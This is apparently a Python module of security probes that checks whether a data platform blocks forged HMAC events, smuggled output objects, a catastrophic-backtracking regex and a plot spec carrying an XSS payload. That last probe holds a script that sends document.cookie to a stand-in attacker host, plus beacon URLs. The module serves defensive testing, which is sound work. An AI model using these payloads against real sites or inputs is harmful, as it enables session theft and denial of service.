"""Control-plane probes: forged events, tampered manifest, ReDoS schema, plot XSS/exfil.

These exercise the platform's own defences — the event HMAC, output-manifest integrity, and
the plot/schema sanitizers — by calling the real ``mapi_spec`` / ``mapi_plots`` code with a
hostile input. Because these defences live in the control plane and do not depend on the
executor, every one of these probes must come out BLOCKED at every isolation level (including
local-process dev). An ALLOWED here is a real finding regardless of sandbox.
"""

from __future__ import annotations

from datetime import UTC, datetime

from mapi_plots.sanitize import SanitizeError, sanitize_plot
from mapi_spec.run import (
    ManifestObject,
    OutputManifest,
    RunnerPhase,
    StatePayload,
    make_event,
    new_hmac_key,
    sign_output_manifest,
    verify_event,
    verify_output_manifest,
    verify_output_objects,
)
from mapi_spec.storage import ObjectMeta, crc32c, crc32c_to_base64, md5_base64

from mapi_security.outcomes import Category, Outcome, ProbeResult
from mapi_security.probes import Probe

_RUN = "run_01jsecurityprobe00000000000"
_PREFIX = f"t/acme/runs/{_RUN}/a1/"


def _result(pid: str, outcome: Outcome, detail: str, **ev: object) -> ProbeResult:
    return ProbeResult(pid, Category.PLATFORM, outcome, detail, ev)


def forged_stdout_event() -> ProbeResult:
    """Forge a run event the user controls (wrong HMAC) and see if it verifies.

    In the sandbox only the supervisor signs stdout with the per-run key; user code that
    prints a ``{"mapi_event": ...}`` line cannot produce a valid HMAC. The control plane
    (events service) drops any event whose HMAC does not verify.
    """
    pid = "forged_stdout_event"
    real_key = new_hmac_key()
    attacker_key = new_hmac_key()
    forged = make_event(_RUN, 1, 5, StatePayload(phase=RunnerPhase.FIT), key=attacker_key)
    if verify_event(forged, real_key):
        return _result(pid, Outcome.ALLOWED, "a forged event verified under the run key")
    return _result(pid, Outcome.BLOCKED, "forged event rejected (HMAC mismatch)")


def tampered_manifest() -> ProbeResult:
    """Ship an output object the signed manifest does not list (artifact smuggling)."""
    pid = "tampered_manifest"
    key = new_hmac_key()
    good = b"legitimate bundle bytes"
    manifest = sign_output_manifest(
        OutputManifest(
            tenant_id="acme",
            project_id="default",
            run_id=_RUN,
            attempt=1,
            kind="fit",
            status="complete",
            prefix=_PREFIX,
            spec_hash="sha256:" + "ab" * 32,
            catalog_digest="sha256:" + "cd" * 32,
            objects={
                "bundle.zarr.zip": ManifestObject(
                    key=_PREFIX + "bundle.zarr.zip",
                    size=len(good),
                    crc32c=crc32c_to_base64(crc32c(good)),
                    md5=md5_base64(good),
                    content_type="application/zip",
                )
            },
            runner_version="probe-0",
            created_at=datetime.now(UTC),
        ),
        key,
    )
    if not verify_output_manifest(manifest, key):
        return _result(pid, Outcome.ERROR, "manifest did not self-verify")
    now = datetime.now(UTC)

    def meta(name: str, data: bytes) -> ObjectMeta:
        return ObjectMeta(
            bucket="mapi-local-runs",
            name=_PREFIX + name,
            generation=1,
            size=len(data),
            crc32c=crc32c_to_base64(crc32c(data)),
            md5_hash=md5_base64(data),
            content_type="application/octet-stream",
            time_created=now,
        )

    # The store listing contains an extra object the manifest never claimed.
    listing = [meta("bundle.zarr.zip", good), meta("sneaky.bin", b"exfiltrated payload")]
    result = verify_output_objects(manifest, listing, expected_prefix=_PREFIX)
    if result.ok:
        return _result(pid, Outcome.ALLOWED, "an unlisted object passed verification")
    return _result(pid, Outcome.BLOCKED, f"integrity check rejected it: {result.issues[0].message}")


def redos_schema() -> ProbeResult:
    """Embed a catastrophic-backtracking regex in a plot spec's validation pattern.

    The sanitizer must not hand attacker regexes to the standard ``re`` engine (it uses an
    allow-list / RE2-style matcher). We assert the sanitizer completes quickly and rejects or
    neutralises the pattern rather than hanging.
    """
    pid = "redos_schema"
    evil_pattern = "(a+)+$"
    plot = {
        "id": "core.redos",
        "title": "redos",
        "kind": "vega-lite",
        "schema_version": "v5",
        "spec": {
            "mark": "point",
            "data": {"name": "d"},
            "transform": [{"filter": {"field": "x", "oneOf": ["y"]}}],
            "encoding": {
                "x": {
                    "field": "x",
                    "type": "nominal",
                    "axis": {"labelExpr": f"test(/{evil_pattern}/, datum.value)"},
                }
            },
        },
        "datasets": {"d": {"kind": "data_ref", "path": "ui/d.arrow"}},
        "caption_plain": "x" * 32,
        "provenance": {"recipe": "core.redos@1.0.0", "generated_at": "2026-10-15T00:00:00Z"},
    }
    import time

    start = time.perf_counter()
    try:
        sanitize_plot(plot)
    except SanitizeError:
        return _result(
            pid,
            Outcome.BLOCKED,
            "sanitizer rejected the ReDoS expression",
            elapsed_s=round(time.perf_counter() - start, 4),
        )
    elapsed = time.perf_counter() - start
    if elapsed > 2.0:
        return _result(
            pid,
            Outcome.ALLOWED,
            "sanitizer stalled on the regex (ReDoS)",
            elapsed_s=round(elapsed, 4),
        )
    # Accepted but fast and with no raw `re` evaluation of attacker input: the expression
    # allow-list neutralised it. Treat as blocked (the attack did not achieve anything).
    return _result(
        pid,
        Outcome.BLOCKED,
        "expression allow-list neutralised the pattern",
        elapsed_s=round(elapsed, 4),
    )


def plot_xss_exfil() -> ProbeResult:
    """A plot spec with an external image URL (data exfiltration / XSS beacon)."""
    pid = "plot_xss_exfil"
    plot = {
        "id": "evil",
        "title": "exfil",
        "kind": "vega-lite",
        "schema_version": "v5",
        "spec": {
            "mark": {"type": "image", "url": "https://attacker.example/beacon.png"},
            "data": {"name": "d"},
            "encoding": {"url": {"value": "https://attacker.example/leak?q=secret"}},
        },
        "datasets": {"d": {"kind": "data_ref", "path": "ui/d.arrow"}},
        "caption_plain": "<script>fetch('https://attacker.example/'+document.cookie)</script>",
        "provenance": {"recipe": "evil@1.0.0", "generated_at": "2026-10-15T00:00:00Z"},
    }
    try:
        result = sanitize_plot(plot)
    except SanitizeError:
        return _result(pid, Outcome.BLOCKED, "sanitizer rejected the exfil spec")
    # If it did not raise, the sanitizer must at least have stripped the external url/script.
    doc = result.plot.model_dump(mode="json", by_alias=True)
    text = str(doc)
    if "attacker.example" in text:
        return _result(pid, Outcome.ALLOWED, "an external exfil URL survived sanitization")
    return _result(pid, Outcome.BLOCKED, "sanitizer stripped the external references")


def reuse_url_rejected() -> ProbeResult:
    """A bundle manifest for one tenant/generation must not verify against another's.

    Models the plan §8.6 rule that signed URLs are only minted after the manifest's identity
    (tenant, run, generations) matches; a manifest signed by one run cannot be re-presented
    for another run's key.
    """
    pid = "reuse_foreign_manifest"
    key_a = new_hmac_key()
    key_b = new_hmac_key()
    manifest = sign_output_manifest(
        OutputManifest(
            tenant_id="acme",
            project_id="default",
            run_id=_RUN,
            attempt=1,
            kind="fit",
            status="complete",
            prefix=_PREFIX,
            spec_hash="sha256:" + "ab" * 32,
            catalog_digest="sha256:" + "cd" * 32,
            objects={},
            runner_version="probe-0",
            created_at=datetime.now(UTC),
        ),
        key_a,
    )
    # Another run's supervisor key must not verify this manifest.
    if verify_output_manifest(manifest, key_b):
        return _result(pid, Outcome.ALLOWED, "a manifest verified under a foreign run key")
    return _result(pid, Outcome.BLOCKED, "manifest bound to its own run key")


PROBES: tuple[Probe, ...] = (
    Probe(
        "forged_stdout_event",
        Category.PLATFORM,
        "forge a run event (wrong HMAC)",
        forged_stdout_event,
    ),
    Probe(
        "tampered_manifest",
        Category.PLATFORM,
        "smuggle an unlisted output object",
        tampered_manifest,
    ),
    Probe("redos_schema", Category.PLATFORM, "ReDoS regex in a plot/schema", redos_schema),
    Probe(
        "plot_xss_exfil", Category.PLATFORM, "plot spec with an exfil/XSS payload", plot_xss_exfil
    ),
    Probe(
        "reuse_foreign_manifest",
        Category.PLATFORM,
        "reuse another run's signed manifest",
        reuse_url_rejected,
    ),
)
